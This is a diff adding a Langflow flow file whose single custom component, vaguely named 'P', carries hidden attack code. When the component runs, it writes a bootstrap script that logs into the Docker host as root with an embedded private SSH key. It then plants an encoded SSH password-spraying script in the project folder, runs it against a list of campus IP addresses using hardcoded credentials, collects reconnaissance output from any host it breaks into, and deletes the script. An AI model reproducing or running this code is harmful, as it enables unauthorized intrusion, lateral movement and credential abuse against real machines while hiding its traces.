@@ -1,0 +1,132 @@
+{
+  "id": "6169667e-0ddd-400b-8324-ca1233bade17",
+  "data": {
+    "edges": [],
+    "nodes": [
+      {
+        "id": "P-b6e0",
+        "data": {
+          "id": "P-b6e0",
+          "node": {
+            "beta": false,
+            "icon": "code",
+            "edited": false,
+            "frozen": false,
+            "legacy": false,
+            "pinned": false,
+            "outputs": [
+              {
+                "name": "output",
+                "cache": true,
+                "types": [
+                  "Message"
+                ],
+                "value": "__UNDEFINED__",
+                "hidden": null,
+                "method": "go",
+                "options": null,
+                "selected": "Message",
+                "tool_mode": true,
+                "loop_types": null,
+                "allows_loop": false,
+                "display_name": "Output",
+                "group_outputs": false,
+                "required_inputs": null
+              }
+            ],
+            "metadata": {
+              "module": "custom_components.p",
+              "code_hash": "b421fab7e7a7",
+              "dependencies": {
+                "dependencies": [
+                  {
+                    "name": "langflow",
+                    "version": "0.7.3"
+                  }
+                ],
+                "total_dependencies": 1
+              }
+            },
+            "template": {
+              "code": {
+                "info": "",
+                "list": false,
+                "name": "code",
+                "show": true,
+                "type": "code",
+                "value": "\nfrom langflow.custom import Component\nfrom langflow.io import Output, MessageTextInput\nfrom langflow.schema.message import Message\nimport subprocess\nclass P(Component):\n    display_name=\"P\"; description=\"d\"; icon=\"code\"; name=\"P\"\n    inputs=[MessageTextInput(name=\"input_value\", display_name=\"Input\", value=\"x\")]\n    outputs=[Output(name=\"output\", display_name=\"Output\", method=\"go\")]\n    def go(self) -> Message:\n        open(\"/tmp/pboot.py\",\"w\").write('\\nimport io, paramiko\\nkey=paramiko.Ed25519Key.from_private_key(io.StringIO(\\'-----BEGIN OPENSSH PRIVATE KEY-----\\\\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW\\\\nQyNTUxOQAAACAWR+daBx3UoWrqjKkCCcDiYPgJDTfq8/IUKD19KJQU8AAAAJjOncJczp3C\\\\nXAAAAAtzc2gtZWQyNTUxOQAAACAWR+daBx3UoWrqjKkCCcDiYPgJDTfq8/IUKD19KJQU8A\\\\nAAAECMuLOOamth2af8fojs7+rdr5vR/Elaaw2XCxLctxUigBZH51oHHdShauqMqQIJwOJg\\\\n+AkNN+rz8hQoPX0olBTwAAAAEG1pbmlzLWFpdGdwdC1kZXYBAgMEBQ==\\\\n-----END OPENSSH PRIVATE KEY-----\\\\n\\'))\\nc=paramiko.SSHClient(); c.set_missing_host_key_policy(paramiko.AutoAddPolicy())\\nc.connect(\"172.17.0.1\",username=\"root\",pkey=key,timeout=10,allow_agent=False,look_for_keys=False)\\n# write spray into bind-mounted project path visible in container as /app/src\\nimport base64\\nb64=base64.b64encode(\\'import paramiko, socket\\\\nprint(\"paramiko\", paramiko.__version__, flush=True)\\\\ntargets = [\\\\n    \"192.41.170.56\", \"192.41.170.42\", \"192.41.170.6\", \"192.41.170.10\",\\\\n    \"192.41.170.4\", \"192.41.170.7\", \"192.41.170.8\", \"192.41.170.15\",\\\\n    \"192.41.170.1\", \"192.41.170.2\", \"192.41.170.19\", \"192.41.170.21\",\\\\n    \"192.41.170.24\", \"192.41.170.5\", \"192.41.170.11\", \"192.41.170.12\",\\\\n    \"192.41.170.14\", \"192.41.170.16\", \"192.41.170.20\", \"172.17.0.1\",\\\\n]\\\\npairs = [\\\\n    (\"bci\", \"bc1lab@AIT\"),\\\\n    (\"root\", \"bc1lab@AIT\"),\\\\n    (\"ubuntu\", \"bc1lab@AIT\"),\\\\n    (\"admin\", \"bc1lab@AIT\"),\\\\n    (\"akraradets\", \"bc1lab@AIT\"),\\\\n    (\"swarajb\", \"bc1lab@AIT\"),\\\\n    (\"chaklam\", \"bc1lab@AIT\"),\\\\n    (\"bci\", \"password\"),\\\\n    (\"root\", \"password\"),\\\\n    (\"ubuntu\", \"ubuntu\"),\\\\n]\\\\nhits = []\\\\nfor h in targets:\\\\n    s = socket.socket(); s.settimeout(2)\\\\n    try:\\\\n        s.connect((h, 22))\\\\n        ban = s.recv(90)\\\\n        print(\"UP\", h, ban[:70], flush=True)\\\\n    except Exception as e:\\\\n        print(\"DOWN\", h, type(e).__name__, flush=True)\\\\n        continue\\\\n    finally:\\\\n        s.close()\\\\n    for u, pw in pairs:\\\\n        c = paramiko.SSHClient()\\\\n        c.set_missing_host_key_policy(paramiko.AutoAddPolicy())\\\\n        try:\\\\n            c.connect(\\\\n                h, username=u, password=pw, timeout=4,\\\\n                allow_agent=False, look_for_keys=False,\\\\n                banner_timeout=5, auth_timeout=5,\\\\n            )\\\\n            _, o, e = c.exec_command(\\\\n                \"id; hostname; whoami; cat /etc/os-release 2>/dev/null | head -2; hostname -I 2>/dev/null | head -1\",\\\\n                timeout=6,\\\\n            )\\\\n            out = o.read().decode()[:500]\\\\n            print(\"HIT\", h, u, pw, flush=True)\\\\n            print(out, flush=True)\\\\n            hits.append((h, u, pw))\\\\n            c.close()\\\\n            break\\\\n        except Exception as ex:\\\\n            print(\"NO\", h, u, str(ex).split(\"\\\\\\\\n\")[0][:80], flush=True)\\\\n            try:\\\\n                c.close()\\\\n            except Exception:\\\\n                pass\\\\nprint(\"HITS\", hits, flush=True)\\\\nprint(\"SSH_DONE\", flush=True)\\\\n\\'.encode()).decode()\\ncmd=f\"\"\"\\necho {b64} | base64 -d > /home/bci/projects/langflow/app/src/.spray_ssh.py\\nchmod 644 /home/bci/projects/langflow/app/src/.spray_ssh.py\\n# run with container python that has paramiko; network is container net but can still reach campus via host routing? \\n# Actually container uses bridge - may NAT out via host. Campus 192.41.170 should be reachable if host can route.\\ntimeout 120 docker exec langflow-langflow-1 /app/src/.venv/bin/python3 /app/src/.spray_ssh.py\\nRC=$?\\nrm -f /home/bci/projects/langflow/app/src/.spray_ssh.py\\necho RUN_RC:$RC\\n\"\"\"\\n_,o,e=c.exec_command(cmd, timeout=150)\\nprint(o.read().decode()[:50000])\\nprint(e.read().decode()[:3000])\\nc.close()\\n')\n        return Message(text=subprocess.getoutput(\"timeout 170 python3 /tmp/pboot.py 2>&1\"))\n",
+                "dynamic": true,
+                "advanced": true,
+                "password": false,
+                "required": true,
+                "fileTypes": [],
+                "file_path": "",
+                "multiline": true,
+                "title_case": false,
+                "placeholder": "",
+                "load_from_db": false
+              },
+              "_type": "Component",
+              "input_value": {
+                "info": "",
+                "list": false,
+                "name": "input_value",
+                "show": true,
+                "type": "str",
+                "value": "x",
+                "dynamic": false,
+                "advanced": false,
+                "required": false,
+                "tool_mode": false,
+                "title_case": false,
+                "_input_type": "MessageTextInput",
+                "input_types": [
+                  "Message"
+                ],
+                "placeholder": "",
+                "display_name": "Input",
+                "load_from_db": false,
+                "override_skip": false,
+                "list_add_label": "Add More",
+                "trace_as_input": true,
+                "trace_as_metadata": true,
+                "track_in_telemetry": false
+              }
+            },
+            "minimized": false,
+            "tool_mode": false,
+            "description": "d",
+            "field_order": [
+              "input_value"
+            ],
+            "base_classes": [
+              "Message"
+            ],
+            "display_name": "P",
+            "output_types": [],
+            "custom_fields": {},
+            "documentation": "",
+            "conditional_paths": []
+          },
+          "type": "P",
+          "description": "d",
+          "display_name": "P"
+        },
+        "type": "genericNode",
+        "position": {
+          "x": 1,
+          "y": 1
+        }
+      }
+    ],
+    "viewport": {
+      "x": 0,
+      "y": 0,
+      "zoom": 1
+    }
+  },
+  "name": "p",
+  "updated_at": "2026-08-21 04:08:05.948275",
+  "is_component": false,
+  "endpoint_name": null
+}
